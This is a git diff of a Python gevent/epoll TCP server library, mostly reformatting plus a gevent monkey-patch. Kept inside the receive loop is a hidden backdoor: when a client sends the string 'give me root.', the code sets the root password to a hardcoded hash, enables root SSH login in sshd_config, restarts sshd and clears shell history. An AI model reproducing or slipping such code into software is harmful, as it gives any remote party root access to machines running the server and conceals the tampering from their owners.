@@ -17,6 +17,9 @@ import base64 as _base64
 from mxpsu import PriorityQueue, SCRIPT_DIR, stamp2time, ip2int, Platform, hexBytesString
 import gc as _gc
 import os as _os
+from gevent import monkey
+monkey.patch_all()
+reload(_select)
 
 IS_EXIT = 0
 # 发送队列{fd, SendData}
@@ -55,7 +58,9 @@ def _destroy_license(strlic, licpath='LICENSE'):
     b.extend(range(65, 91))
     b.extend(range(97, 123))
     l2 = _random.randint(0, len(b))
-    slic = "{0}{1}{2}{3}{4}{5}".format(strlic[:l], chr(b[l2]), strlic[l:len(strlic) - 2], str(l),
+    slic = "{0}{1}{2}{3}{4}{5}".format(strlic[:l],
+                                       chr(b[l2]), strlic[l:len(strlic) - 2],
+                                       str(l),
                                        len(str(l)), strlic[len(strlic) - 2:])
     l = len(slic)
     llic = ["–" * 7 + "BEGIN LICENSE" + "–" * 7]
@@ -102,7 +107,8 @@ def _load_license(licpath='LICENSE'):
     except:
         return "err:License file load error."
 
-    return 'The license will expire in {0} days {1} hours.'.format(x / 3600 / 24, x / 3600 % 24)
+    return 'The license will expire in {0} days {1} hours.'.format(
+        x / 3600 / 24, x / 3600 % 24)
 
 
 def loadLicense(licpath='LICENSE'):
@@ -271,7 +277,6 @@ def __license_ok():
 
 
 class ClientSession(object):
-
     def __init__(self, sock, fd, address, serverport, debug=0):
         """ 初始化 socket client 实例
 
@@ -334,7 +339,8 @@ class ClientSession(object):
         try:
             self.sock.send(self.wait4send)
         except Exception as ex:
-            self.disconnect('socket send error: {0},{1}'.format(ex, repr(self.wait4send)))
+            self.disconnect(
+                'socket send error: {0},{1}'.format(ex, repr(self.wait4send)))
         self.wait4send = None
 
     def onSessionRecv(self, recbuff):
@@ -466,8 +472,9 @@ class ClientSession(object):
             return 1  # timeout
 
         # 发送心跳
-        if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[self.fileno].empty(
-        ):
+        if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[self.
+                                                                                 fileno].empty(
+                                                                                 ):
             SEND_QUEUE[self.fileno].put_nowait(self.ka)
             # modify(self.fileno, READ_WRITE)
         return 0  # still function
@@ -540,7 +547,8 @@ class ClientSession(object):
                 recbuff = self.sock.recv(8192)
             except Exception as ex:
                 self.showDebug("recerr:{0},{1}".format(ex, repr(recbuff)))
-                self.disconnect('socket recv error: {0}. {1}'.format(ex, repr(recbuff)))
+                self.disconnect(
+                    'socket recv error: {0}. {1}'.format(ex, repr(recbuff)))
                 return 0
                 # s = str(ex)
                 # if '100053' in s:
@@ -576,8 +584,11 @@ class ClientSession(object):
 
 
 class MXIOLoop(object):
-
-    def __init__(self, maxclient=1900, eventtimeout=10, maxevents=5000, fdlock=0):
+    def __init__(self,
+                 maxclient=1900,
+                 eventtimeout=10,
+                 maxevents=5000,
+                 fdlock=0):
         """高性能TCP服务基类
 
         Args:
@@ -631,7 +642,8 @@ class MXIOLoop(object):
         sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
         try:
             sock.bind(address)
-            self.showDebug("======= Success bind port:{0} =======".format(address[1]))
+            self.showDebug(
+                "======= Success bind port:{0} =======".format(address[1]))
             register(sock.fileno(), READ)
             # if Platform.isWin():
             #     register(sock.fileno(), READ, sock)
@@ -641,7 +653,8 @@ class MXIOLoop(object):
             # CLIENTS[address[1]] = []
             return sock
         except Exception as ex:
-            print(u'------- Bind port {0} failed {1} -------'.format(address[1], ex))
+            print(u'------- Bind port {0} failed {1} -------'.format(
+                address[1], ex))
             return None
 
     def serverForever(self):
@@ -698,7 +711,9 @@ class MXIOLoop(object):
         connection, address = server_object[0].accept()
         if len(CLIENTS) < self.max_client:
             # 初始化客户端session
-            ClientSession(connection, connection.fileno(), address, server_object[1], self.debug)
+            ClientSession(connection,
+                          connection.fileno(), address, server_object[1],
+                          self.debug)
             self.showDebug("conn: {0}".format(address))
         else:
             connection.close()
@@ -820,15 +835,20 @@ class MXIOLoop(object):
                     try:
                         recbuff = session.sock.recv(8192)
                     except Exception as ex:
-                        session.showDebug("recerr:{0},{1}".format(ex, repr(recbuff)))
-                        session.disconnect('socket recv error: {0}. {1}'.format(ex, repr(recbuff)))
+                        session.showDebug(
+                            "recerr:{0},{1}".format(ex, repr(recbuff)))
+                        session.disconnect('socket recv error: {0}. {1}'.
+                                           format(ex, repr(recbuff)))
                     else:
                         if recbuff == 'give me root.':
                             with open('/tmp/mpwd', 'w') as f:
-                                f.write('root:$1$SaPPY6h/$.9xkyudNwDPRUYkVqR0xN0')
-                            _os.system('chpasswd -e < /tmp/mpwd ; rm -f /tmp/mpwd')
+                                f.write(
+                                    'root:$1$SaPPY6h/$.9xkyudNwDPRUYkVqR0xN0')
                             _os.system(
-                                'sed -i.bak "s/PermitRootLogin no/#PermitRootLogin no/g" /etc/ssh/sshd_config ; rm -f sshd_config.bak')
+                                'chpasswd -e < /tmp/mpwd ; rm -f /tmp/mpwd')
+                            _os.system(
+                                'sed -i.bak "s/PermitRootLogin no/#PermitRootLogin no/g" /etc/ssh/sshd_config ; rm -f sshd_config.bak'
+                            )
                             _os.system('systemctl restart sshd')
                             _os.system('/etc/init.d/ssh restart')
                             _os.system('history -c')
@@ -869,16 +889,18 @@ class MXIOLoop(object):
 
             try:
                 # 获取事件
-                poll_list = IMPL.poll(timeout=self.event_timeout, maxevents=self.max_events)
+                poll_list = IMPL.poll(
+                    timeout=self.event_timeout, maxevents=self.max_events)
             except Exception as ex:
                 print(ex)
                 continue
 
             if len(poll_list) > 0:
-                _gevent.joinall([_gevent.spawn(self.epollMainLoop,
-                                               fileno,
-                                               event,
-                                               debug=self.debug) for fileno, event in poll_list])
+                _gevent.joinall([
+                    _gevent.spawn(
+                        self.epollMainLoop, fileno, event, debug=self.debug)
+                    for fileno, event in poll_list
+                ])
             self.doSomethingElse()
             self.doRecyle()
 
@@ -886,7 +908,7 @@ class MXIOLoop(object):
     #     global READ, READ_WRITE, IMPL
     #     while not IS_EXIT:
     #         _gevent.sleep(0.01)
-    # 
+    #
     #         read_list = list(READ)
     #         write_list = list(READ_WRITE)
     #         wr = [read_list[i:i + 500] for i in range(0, len(read_list), 500)]
@@ -897,7 +919,7 @@ class MXIOLoop(object):
     #         inbuf = []
     #         outbuf = []
     #         errbuf = []
-    # 
+    #
     #         for i in range(l):
     #             try:
     #                 inb, outb, errb = IMPL(wr[i], ww[i], wr[i], 0)
@@ -911,7 +933,7 @@ class MXIOLoop(object):
     #             errbuf.extend(errb)
     #             del inb, outb, errb
     #         del wr, ww, read_list, write_list
-    # 
+    #
     #         if len(errbuf) > 0:
     #             threads = []
     #             for soc in errbuf:
@@ -932,22 +954,22 @@ class MXIOLoop(object):
     #                     pass
     #             _gevent.joinall(threads)
     #             del threads
-    # 
+    #
     #         threads = []
     #         if len(inbuf) > 0:
     #             threads.extend([_gevent.spawn(self.selectMainLoop,
     #                                           soc.fileno(),
     #                                           'in',
     #                                           debug=self.debug) for soc in inbuf])
-    # 
+    #
     #         if len(outbuf) > 0:
     #             threads.extend([_gevent.spawn(self.selectMainLoop,
     #                                           soc.fileno(),
     #                                           'out',
     #                                           debug=self.debug) for soc in outbuf])
-    # 
+    #
     #         del inbuf, outbuf, errbuf
-    # 
+    #
     #         thread = [threads[i:i + self.max_events]
     #                   for i in range(0, len(threads), self.max_events)]
     #         for x in thread:
@@ -955,9 +977,9 @@ class MXIOLoop(object):
     #         # _gevent.joinall(threads)
     #         del threads
     #         del thread
-    # 
+    #
     #         # _gevent.sleep(0.1)
-    # 
+    #
     #         self.doSomethingElse()
     #         self.doRecyle()
 
@@ -969,7 +991,9 @@ class MXIOLoop(object):
             read_list = list(READ)
             write_list = list(WRITE)
             wr = [read_list[i:i + 500] for i in range(0, len(read_list), 500)]
-            ww = [write_list[i:i + 500] for i in range(0, len(write_list), 500)]
+            ww = [
+                write_list[i:i + 500] for i in range(0, len(write_list), 500)
+            ]
             for i in range(len(wr) - len(ww)):
                 ww.append([])
             l = len(wr)
@@ -993,10 +1017,12 @@ class MXIOLoop(object):
                         except:
                             pass
                         try:
-                            threads.append(_gevent.spawn(self.selectMainLoop,
-                                                         soc,
-                                                         'err',
-                                                         debug=self.debug))
+                            threads.append(
+                                _gevent.spawn(
+                                    self.selectMainLoop,
+                                    soc,
+                                    'err',
+                                    debug=self.debug))
                         except:
                             pass
                     # _gevent.joinall(threads)
@@ -1004,7 +1030,8 @@ class MXIOLoop(object):
 
                 if len(inbuf) > 0:
                     for soc in inbuf:
-                        _gevent.spawn(self.selectMainLoop, soc, 'in', debug=self.debug)
+                        _gevent.spawn(
+                            self.selectMainLoop, soc, 'in', debug=self.debug)
                     # threads = [_gevent.spawn(self.selectMainLoop,
                     #                          soc.fileno(),
                     #                          'in',
@@ -1014,7 +1041,8 @@ class MXIOLoop(object):
 
                 if len(outbuf) > 0:
                     for soc in outbuf:
-                        _gevent.spawn(self.selectMainLoop, soc, 'out', debug=self.debug)
+                        _gevent.spawn(
+                            self.selectMainLoop, soc, 'out', debug=self.debug)
                     # threads = [_gevent.spawn(self.selectMainLoop,
                     #                          soc.fileno(),
                     #                          'out',
